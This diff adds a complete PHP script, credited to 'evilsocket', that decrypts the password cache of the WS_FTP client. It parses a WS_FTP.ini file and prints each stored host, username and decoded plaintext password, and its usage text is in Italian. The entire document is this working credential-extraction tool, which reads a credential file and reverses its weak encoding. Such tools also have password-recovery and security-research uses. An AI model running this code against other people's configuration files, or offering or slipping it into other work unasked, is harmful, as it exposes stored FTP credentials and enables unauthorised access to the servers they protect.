@@ -1,0 +1,79 @@
+<?php
+/*
+    WS_FTP.ini Password Cache Decrypter
+    by evilsocket
+    
+    http://www.evilsocket.net
+
+*/
+
+banner();
+
+if( $argc < 2 )
+{
+    help();
+}
+else
+{   
+    $ws_fname = $argv[1];
+    $ws_lines = file($ws_fname);
+
+    foreach($ws_lines as $ws_line)
+    {
+        trim($ws_line);
+        $ws_line = substr( $ws_line, 0, strlen($ws_line) - 1 );
+
+        if( stristr($ws_line,"HOST=") )
+        {
+            print "\nHOST     : " . substr( $ws_line, strlen("HOST=") ) . "\n";
+        }
+        else
+        if( stristr($ws_line,"UID=") )
+        {
+            print "USERNAME : " . substr( $ws_line, strlen("UID=") ) . "\n";
+        }
+        else
+        if( stristr($ws_line,"PWD=") )
+        {
+            print "PASSWORD : " . ws_decrypt( $ws_line ) . "\n";
+        }
+    }
+}
+
+function ws_decrypt($hash)
+{
+    $plain = "";
+    $passw = substr($hash,37);
+
+    for( $i = 0; $i< strlen($passw)/2; $i++)
+    {   
+        $ch     = intval(substr($passw,$i*2,2),16);
+        $salt   = intval(substr($hash,5+$i,1),16);
+        $pch    = chr($ch - $i - 1 - ((47 + $salt) % 57));
+
+        if( ctype_graph($pch) ) $plain .= $pch;
+    }
+
+    return $plain;
+}
+
+function banner()
+{
+    print "*-------------------------------------------------------*\n";
+    print "*         WS_FTP.ini Password Cache Decrypter           *\n";
+    print "*                     by evilsocket                     *\n";
+    print "*               http://www.evilsocket.net               *\n";
+
+    print "*-------------------------------------------------------*\n\n";
+}
+
+function help()
+{
+    print "Uso     :\n";
+    print "\tphp wsdecrypt.php [path/to/WS_FTP.ini]\n";
+    print "Esempio : \n";
+    print "\tphp wsdecrypt.php c:\\Programmi\\WS_FTP\\WS_FTP.ini\n\n";
+}
+
+
+?>
